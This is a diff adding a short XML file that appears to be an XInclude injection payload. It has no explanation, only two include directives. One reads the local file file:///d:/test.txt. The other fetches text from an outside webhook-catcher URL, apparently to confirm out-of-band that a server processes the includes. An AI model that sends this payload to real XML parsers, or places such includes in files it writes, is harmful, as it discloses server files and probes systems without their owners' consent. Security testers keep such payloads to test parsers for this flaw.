@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///d:/test.txt"/>
+    <xi:include parse="text" href="https://webhook.uutool.cn/4pt2j105b8e0?xi"/>
+</foo>
+</root>
